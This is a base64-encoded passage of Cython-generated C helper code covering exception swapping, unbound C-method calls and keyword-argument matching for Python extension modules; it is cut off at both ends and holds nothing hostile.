FjZWJhY2sgPSB0YjsKICAgICNlbHNlCiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTsKICAgIHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+ZXhjX3R5cGUgPSB0eXBlOwogICAgdHN0YXRlLT5leGNfdmFsdWUgPSB2YWx1ZTsKICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9IHRiOwogICAgI2VuZGlmCiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTsKICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYodG1wX3RiKTsKICAjZW5kaWYKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblN3YXAoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHsKICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjsKICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEIwMGE0CiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9ICp2YWx1ZTsKICAgIGlmICh0bXBfdmFsdWUgPT0gTlVMTCB8fCB0bXBfdmFsdWUgPT0gUHlfTm9uZSkgewogICAgICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTsKICAgICAgICB0bXBfdmFsdWUgPSBOVUxMOwogICAgICAgIHRtcF90eXBlID0gTlVMTDsKICAgICAgICB0bXBfdGIgPSBOVUxMOwogICAgfSBlbHNlIHsKICAgICAgICB0bXBfdHlwZSA9IChQeU9iamVjdCopIFB5X1RZUEUodG1wX3ZhbHVlKTsKICAgICAgICBQeV9JTkNSRUYodG1wX3R5cGUpOwogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICB0bXBfdGIgPSAoKFB5QmFzZUV4Y2VwdGlvbk9iamVjdCopIHRtcF92YWx1ZSktPnRyYWNlYmFjazsKICAgICAgICBQeV9YSU5DUkVGKHRtcF90Yik7CiAgICAgICAgI2Vsc2UKICAgICAgICB0bXBfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2sodG1wX3ZhbHVlKTsKICAgICAgICAjZW5kaWYKICAgIH0KICAjZWxpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87CiAgICB0bXBfdHlwZSA9IGV4Y19pbmZvLT5leGNfdHlwZTsKICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjazsKICAgIGV4Y19pbmZvLT5leGNfdHlwZSA9ICp0eXBlOwogICAgZXhjX2luZm8tPmV4Y192YWx1ZSA9ICp2YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gKnRiOwogICNlbHNlCiAgICB0bXBfdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTsKICAgIHRtcF90YiA9IHRzdGF0ZS0+ZXhjX3RyYWNlYmFjazsKICAgIHRzdGF0ZS0+ZXhjX3R5cGUgPSAqdHlwZTsKICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gKnZhbHVlOwogICAgdHN0YXRlLT5leGNfdHJhY2ViYWNrID0gKnRiOwogICNlbmRpZgogICAgKnR5cGUgPSB0bXBfdHlwZTsKICAgICp2YWx1ZSA9IHRtcF92YWx1ZTsKICAgICp0YiA9IHRtcF90YjsKfQojZWxzZQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X0V4Y2VwdGlvblN3YXAoUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgICBQeUVycl9HZXRFeGNJbmZvKCZ0bXBfdHlwZSwgJnRtcF92YWx1ZSwgJnRtcF90Yik7CiAgICBQeUVycl9TZXRFeGNJbmZvKCp0eXBlLCAqdmFsdWUsICp0Yik7CiAgICAqdHlwZSA9IHRtcF90eXBlOwogICAgKnZhbHVlID0gdG1wX3ZhbHVlOwogICAgKnRiID0gdG1wX3RiOwp9CiNlbmRpZgoKCnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcigKICAgIGNvbnN0IGNoYXIqIGZ1bmNfbmFtZSwKICAgIFB5T2JqZWN0KiBrd19uYW1lKQp7CiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLAogICAgICAgICIlcygpIGdvdCBtdWx0aXBsZSB2YWx1ZXMgZm9yIGtleXdvcmQgYXJndW1lbnQgJyVVJyIsIGZ1bmNfbmFtZSwga3dfbmFtZSk7Cn0KCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqYXJncywgUHlPYmplY3QgKmt3YXJncykgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIFB5T2JqZWN0ICpzZWxmbGVzc19hcmdzID0gUHlUdXBsZV9HZXRTbGljZShhcmdzLCAxLCBQeVR1cGxlX1NpemUoYXJncykpOwogICAgaWYgKHVubGlrZWx5KCFzZWxmbGVzc19hcmdzKSkgcmV0dXJuIE5VTEw7CiAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsKG1ldGhvZCwgc2VsZmxlc3NfYXJncywga3dhcmdzKTsKICAgIFB5X0RFQ1JFRihzZWxmbGVzc19hcmdzKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VsaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7CiAgICAgICAgcmV0dXJuIF9QeU9iamVjdF9WZWN0b3JjYWxsCiAgICAgICAgICAgIChtZXRob2QsIGFyZ3MgPyBhcmdzKzEgOiBOVUxMLCBuYXJncyA/IG5hcmdzLTEgOiAwLCBrd25hbWVzKTsKfQojZWxzZQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1NlbGZsZXNzQ2FsbChQeU9iamVjdCAqbWV0aG9kLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MsIFB5T2JqZWN0ICprd25hbWVzKSB7CiAgICByZXR1cm4KI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMAogICAgX1B5T2JqZWN0X1ZlY3RvcmNhbGwKI2Vsc2UKICAgIFB5T2JqZWN0X1ZlY3RvcmNhbGwKI2VuZGlmCiAgICAgICAgKG1ldGhvZCwgYXJncyA/IGFyZ3MrMSA6IE5VTEwsIG5hcmdzID8gKHNpemVfdCkgbmFyZ3MtMSA6IDAsIGt3bmFtZXMpOwp9CiNlbmRpZgpzdGF0aWMgUHlNZXRob2REZWYgX19QeXhfVW5ib3VuZENNZXRob2RfRGVmID0gewogICAgICJDeXRob25VbmJvdW5kQ01ldGhvZCIsCiAgICAgX19QWVhfUkVJTlRFUlBSRVRfRlVOQ0lPTihQeUNGdW5jdGlvbiwgX19QeXhfU2VsZmxlc3NDYWxsKSwKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwMDAKICAgICBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTLAojZWxzZQogICAgIE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTLAojZW5kaWYKICAgICBOVUxMCn07CnN0YXRpYyBpbnQgX19QeXhfVHJ5VW5wYWNrVW5ib3VuZENNZXRob2QoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uKiB0YXJnZXQpIHsKICAgIFB5T2JqZWN0ICptZXRob2QsICpyZXN1bHQ9TlVMTDsKICAgIG1ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIodGFyZ2V0LT50eXBlLCAqdGFyZ2V0LT5tZXRob2RfbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIW1ldGhvZCkpCiAgICAgICAgcmV0dXJuIC0xOwogICAgcmVzdWx0ID0gbWV0aG9kOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBpZiAobGlrZWx5KF9fUHl4X1R5cGVDaGVjayhtZXRob2QsICZQeU1ldGhvZERlc2NyX1R5cGUpKSkKICAgIHsKICAgICAgICBQeU1ldGhvZERlc2NyT2JqZWN0ICpkZXNjciA9IChQeU1ldGhvZERlc2NyT2JqZWN0KikgbWV0aG9kOwogICAgICAgIHRhcmdldC0+ZnVuYyA9IGRlc2NyLT5kX21ldGhvZC0+bWxfbWV0aDsKICAgICAgICB0YXJnZXQtPmZsYWcgPSBkZXNjci0+ZF9tZXRob2QtPm1sX2ZsYWdzICYgfihNRVRIX0NMQVNTIHwgTUVUSF9TVEFUSUMgfCBNRVRIX0NPRVhJU1QgfCBNRVRIX1NUQUNLTEVTUyk7CiAgICB9IGVsc2UKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKI2Vsc2UKICAgIGlmIChQeUNGdW5jdGlvbl9DaGVjayhtZXRob2QpKQojZW5kaWYKICAgIHsKICAgICAgICBQeU9iamVjdCAqc2VsZjsKICAgICAgICBpbnQgc2VsZl9mb3VuZDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCiAgICAgICAgc2VsZiA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcobWV0aG9kLCAiX19zZWxmX18iKTsKICAgICAgICBpZiAoIXNlbGYpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB9CiNlbHNlCiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dFVF9TRUxGKG1ldGhvZCk7CiNlbmRpZgogICAgICAgIHNlbGZfZm91bmQgPSAoc2VsZiAmJiBzZWxmICE9IFB5X05vbmUpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgICAgICBQeV9YREVDUkVGKHNlbGYpOwojZW5kaWYKICAgICAgICBpZiAoc2VsZl9mb3VuZCkgewogICAgICAgICAgICBQeU9iamVjdCAqdW5ib3VuZF9tZXRob2QgPSBQeUNGdW5jdGlvbl9OZXcoJl9fUHl4X1VuYm91bmRDTWV0aG9kX0RlZiwgbWV0aG9kKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF1bmJvdW5kX21ldGhvZCkpIHJldHVybiAtMTsKICAgICAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgICAgIHJlc3VsdCA9IHVuYm91bmRfbWV0aG9kOwogICAgICAgIH0KICAgIH0KI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORwogICAgaWYgKHVubGlrZWx5KHRhcmdldC0+bWV0aG9kKSkgewogICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpOwogICAgfSBlbHNlCiNlbmRpZgogICAgdGFyZ2V0LT5tZXRob2QgPSByZXN1bHQ7CiAgICByZXR1cm4gMDsKfQoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoX19QeXhfQ2FjaGVkQ0Z1bmN0aW9uICpjZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICphcmcxLCBQeU9iamVjdCAqYXJnMikgewogICAgaW50IHdhc19pbml0aWFsaXplZCA9IF9fUHl4X0NhY2hlZENGdW5jdGlvbl9HZXRBbmRTZXRJbml0aWFsaXppbmcoY2Z1bmMpOwogICAgaWYgKGxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMiAmJiBjZnVuYy0+ZnVuYykpIHsKICAgICAgICBQeU9iamVjdCAqYXJnc1syXSA9IHthcmcxLCBhcmcyfTsKICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gTUVUSF9GQVNUQ0FMTCkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfQ2FsbENGdW5jdGlvbkZhc3QoY2Z1bmMsIHNlbGYsIGFyZ3MsIDIpOwogICAgICAgIH0KICAgICAgICBpZiAoY2Z1bmMtPmZsYWcgPT0gKE1FVEhfRkFTVENBTEwgfCBNRVRIX0tFWVdPUkRTKSkKICAgICAgICAgICAgcmV0dXJuIF9fUHl4X0NhbGxDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzKGNmdW5jLCBzZWxmLCBhcmdzLCAyLCBOVUxMKTsKICAgIH0KI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HCiAgICBlbHNlIGlmICh1bmxpa2VseSh3YXNfaW5pdGlhbGl6ZWQgPT0gMSkpIHsKICAgICAgICBfX1B5eF9DYWNoZWRDRnVuY3Rpb24gdG1wX2NmdW5jID0gewojaWZuZGVmIF9fY3BsdXNwbHVzCiAgICAgICAgICAgIDAKI2VuZGlmCiAgICAgICAgfTsKICAgICAgICB0bXBfY2Z1bmMudHlwZSA9IGNmdW5jLT50eXBlOwogICAgICAgIHRtcF9jZnVuYy5tZXRob2RfbmFtZSA9IGNmdW5jLT5tZXRob2RfbmFtZTsKICAgICAgICByZXR1cm4gX19QeXhfX0NhbGxVbmJvdW5kQ01ldGhvZDIoJnRtcF9jZnVuYywgc2VsZiwgYXJnMSwgYXJnMik7CiAgICB9CiNlbmRpZgogICAgUHlPYmplY3QgKnJlc3VsdCA9IF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKGNmdW5jLCBzZWxmLCBhcmcxLCBhcmcyKTsKICAgIF9fUHl4X0NhY2hlZENGdW5jdGlvbl9TZXRGaW5pc2hlZEluaXRpYWxpemluZyhjZnVuYyk7CiAgICByZXR1cm4gcmVzdWx0Owp9CiNlbmRpZgpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19DYWxsVW5ib3VuZENNZXRob2QyKF9fUHl4X0NhY2hlZENGdW5jdGlvbiogY2Z1bmMsIFB5T2JqZWN0KiBzZWxmLCBQeU9iamVjdCogYXJnMSwgUHlPYmplY3QqIGFyZzIpewogICAgaWYgKHVubGlrZWx5KCFjZnVuYy0+ZnVuYyAmJiAhY2Z1bmMtPm1ldGhvZCkgJiYgdW5saWtlbHkoX19QeXhfVHJ5VW5wYWNrVW5ib3VuZENNZXRob2QoY2Z1bmMpIDwgMCkpIHJldHVybiBOVUxMOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBpZiAoY2Z1bmMtPmZ1bmMgJiYgKGNmdW5jLT5mbGFnICYgTUVUSF9WQVJBUkdTKSkgewogICAgICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMOwogICAgICAgIFB5T2JqZWN0ICphcmdzID0gUHlUdXBsZV9OZXcoMik7CiAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgUHlfSU5DUkVGKGFyZzEpOwogICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMCwgYXJnMSk7CiAgICAgICAgUHlfSU5DUkVGKGFyZzIpOwogICAgICAgIFB5VHVwbGVfU0VUX0lURU0oYXJncywgMSwgYXJnMik7CiAgICAgICAgaWYgKGNmdW5jLT5mbGFnICYgTUVUSF9LRVlXT1JEUykKICAgICAgICAgICAgcmVzdWx0ID0gX19QeXhfQ2FsbENGdW5jdGlvbldpdGhLZXl3b3JkcyhjZnVuYywgc2VsZiwgYXJncywgTlVMTCk7CiAgICAgICAgZWxzZQogICAgICAgICAgICByZXN1bHQgPSBfX1B5eF9DYWxsQ0Z1bmN0aW9uKGNmdW5jLCBzZWxmLCBhcmdzKTsKICAgICAgICBQeV9ERUNSRUYoYXJncyk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QgKmFyZ3NbNF0gPSB7TlVMTCwgc2VsZiwgYXJnMSwgYXJnMn07CiAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGNmdW5jLT5tZXRob2QsIGFyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7CiAgICB9Cn0KCgpzdGF0aWMgaW50IF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncygKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpmaXJzdF9rd19hcmcsCiAgICBjb25zdCBjaGFyKiBmdW5jdGlvbl9uYW1lKQp7CiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZSA9IGFyZ25hbWVzOwogICAgd2hpbGUgKG5hbWUgIT0gZmlyc3Rfa3dfYXJnKSB7CiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTsKICAgICAgICBpbnQgZm91bmQgPSBQeURpY3RfQ29udGFpbnMoa3dkcywga2V5KTsKICAgICAgICBpZiAodW5saWtlbHkoZm91bmQpKSB7CiAgICAgICAgICAgIGlmIChmb3VuZCA9PSAxKSBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTsKICAgICAgICAgICAgZ290byBiYWQ7CiAgICAgICAgfQogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIHJldHVybiAwOwpiYWQ6CiAgICByZXR1cm4gLTE7Cn0KI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1VuaWNvZGVLZXl3b3Jkc0VxdWFsKFB5T2JqZWN0ICpzMSwgUHlPYmplY3QgKnMyKSB7CiAgICBpbnQga2luZDsKICAgIFB5X3NzaXplX3QgbGVuID0gUHlVbmljb2RlX0dFVF9MRU5HVEgoczEpOwogICAgaWYgKGxlbiAhPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChzMikpIHJldHVybiAwOwogICAga2luZCA9IFB5VW5pY29kZV9LSU5EKHMxKTsKICAgIGlmIChraW5kICE9IFB5VW5pY29kZV9LSU5EKHMyKSkgcmV0dXJuIDA7CiAgICBjb25zdCB2b2lkICpkYXRhMSA9IFB5VW5pY29kZV9EQVRBKHMxKTsKICAgIGNvbnN0IHZvaWQgKmRhdGEyID0gUHlVbmljb2RlX0RBVEEoczIpOwogICAgcmV0dXJuIChtZW1jbXAoZGF0YTEsIGRhdGEyLCAoc2l6ZV90KSBsZW4gKiAoc2l6ZV90KSBraW5kKSA9PSAwKTsKfQojZW5kaWYKc3RhdGljIGludCBfX1B5eF9NYXRjaEtleXdvcmRBcmdfc3RyKAogICAgUHlPYmplY3QgKmtleSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgc2l6ZV90ICppbmRleF9mb3VuZCwKICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpCnsKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lOwogICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgIFB5X2hhc2hfdCBrZXlfaGFzaCA9ICgoUHlBU0NJSU9iamVjdCopa2V5KS0+aGFzaDsKICAgIGlmICh1bmxpa2VseShrZXlfaGFzaCA9PSAtMSkpIHsKICAgICAgICBrZXlfaGFzaCA9IFB5T2JqZWN0X0hhc2goa2V5KTsKICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gLTEpKQogICAgICAgICAgICBnb3RvIGJhZDsKICAgIH0KICAgICNlbmRpZgogICAgbmFtZSA9IGZpcnN0X2t3X2FyZzsKICAgIHdoaWxlICgqbmFtZSkgewogICAgICAgIFB5T2JqZWN0ICpuYW1lX3N0ciA9ICoqbmFtZTsKICAgICAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUwogICAgICAgIGlmIChrZXlfaGFzaCA9PSAoKFB5QVNDSUlPYmplY3QqKW5hbWVfc3RyKS0+aGFzaCAmJiBfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChuYW1lX3N0ciwga2V5KSkgewogICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgICNlbHNlCiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFCiAgICAgICAgaWYgKFB5VW5pY29kZV9HRVRfTEVOR1RIKG5hbWVfc3RyKSA9PSBQeVVuaWNvZGVfR0VUX0xFTkdUSChrZXkpKQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpOwogICAgICAgICAgICBpZiAoY21wIDwgMCAmJiB1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7CiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkgewogICAgICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7CiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjZW5kaWYKICAgICAgICBuYW1lKys7CiAgICB9CiAgICBuYW1lID0gYXJnbmFtZXM7CiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHsKICAgICAgICBQeU9iamVjdCAqbmFtZV9zdHIgPSAqKm5hbWU7CiAgICAgICAgI2lmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFMKICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2gpKSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9Vbmljb2RlS2V5d29yZHNFcXVhbChuYW1lX3N0ciwga2V5KSkKICAgICAgICAgICAgICAgIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTsKICAgICAgICB9CiAgICAgICAgI2Vsc2UKICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBpZiAoUHlVbmljb2RlX0dFVF9MRU5HVEgobmFtZV9zdHIpID09IFB5VW5pY29kZV9HRVRfTEVOR1RIKGtleSkpCiAgICAgICAgI2VuZGlmCiAgICAgICAgewogICAgICAgICAgICBpZiAodW5saWtlbHkobmFtZV9zdHIgPT0ga2V5KSkgZ290byBhcmdfcGFzc2VkX3R3aWNlOwogICAgICAgICAgICBpbnQgY21wID0gUHlVbmljb2RlX0NvbXBhcmUobmFtZV9zdHIsIGtleSk7CiAgICAgICAgICAgIGlmIChjbXAgPCAwICYmIHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBnb3RvIGJhZDsKICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIG5hbWUrKzsKICAgIH0KICAgIHJldHVybiAwOwphcmdfcGFzc2VkX3R3aWNlOgogICAgX19QeXhfUmFpc2VEb3VibGVLZXl3b3Jkc0Vycm9yKGZ1bmN0aW9uX25hbWUsIGtleSk7CiAgICBnb3RvIGJhZDsKYmFkOgogICAgcmV0dXJuIC0xOwp9CnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX25vc3RyKAogICAgUHlPYmplY3QgKmtleSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgc2l6ZV90ICppbmRleF9mb3VuZCwKICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpCnsKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpuYW1lOwogICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIGdvdG8gaW52YWxpZF9rZXl3b3JkX3R5cGU7CiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnOwogICAgd2hpbGUgKCpuYW1lKSB7CiAgICAgICAgaW50IGNtcCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCgqKm5hbWUsIGtleSwgUHlfRVEpOwogICAgICAgIGlmIChjbXAgPT0gMSkgewogICAgICAgICAgICAqaW5kZXhfZm91bmQgPSAoc2l6ZV90KSAobmFtZSAtIGFyZ25hbWVzKTsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIGlmICh1bmxpa2VseShjbXAgPT0gLTEpKSBnb3RvIGJhZDsKICAgICAgICBuYW1lKys7CiAgICB9CiAgICBuYW1lID0gYXJnbmFtZXM7CiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHsKICAgICAgICBpbnQgY21wID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKCoqbmFtZSwga2V5LCBQeV9FUSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGNtcCAhPSAwKSkgewogICAgICAgICAgICBpZiAoY21wID09IDEpIGdvdG8gYXJnX3Bhc3NlZF90d2ljZTsKICAgICAgICAgICAgZWxzZSBnb3RvIGJhZDsKICAgICAgICB9CiAgICAgICAgbmFtZSsrOwogICAgfQogICAgcmV0dXJuIDA7CmFyZ19wYXNzZWRfdHdpY2U6CiAgICBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTsKICAgIGdvdG8gYmFkOwppbnZhbGlkX2tleXdvcmRfdHlwZToKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwcygpIGtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIsIGZ1bmN0aW9uX25hbWUpOwogICAgZ290byBiYWQ7CmJhZDoKICAgIHJldHVybiAtMTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnKAogICAgUHlPYmplY3QgKmtleSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sCiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLAogICAgc2l6ZV90ICppbmRleF9mb3VuZCwKICAgIGNvbnN0IGNoYXIgKmZ1bmN0aW9uX25hbWUpCnsKICAgIHJldHVybiBsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3Qoa2V5KSkgPwogICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19zdHIoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSkgOgogICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cihrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTsKfQpzdGF0aWMgdm9pZCBfX1B5eF9SZWplY3RVbmtub3duS2V5d29yZCgKICAgIFB5T2JqZWN0ICprd2RzLAogICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSwKICAgIFB5T2JqZWN0ICoqIGNvbnN0ICpma